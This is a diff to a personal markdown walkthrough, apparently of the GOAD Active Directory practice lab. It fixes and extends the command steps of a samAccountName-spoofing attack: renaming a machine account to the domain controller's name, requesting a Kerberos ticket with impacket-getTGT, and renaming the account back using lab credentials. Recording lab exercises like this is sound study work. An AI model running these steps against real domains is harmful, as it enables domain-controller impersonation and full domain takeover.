@@ -125,5 +125,8 @@ python3 renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' 
 ```
 ![[Pasted image 20230825170216.png]]
 ```bash
-impacket-getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
+impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
 ```
+![[Pasted image 20230825170322.png]]
+```bash
+renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
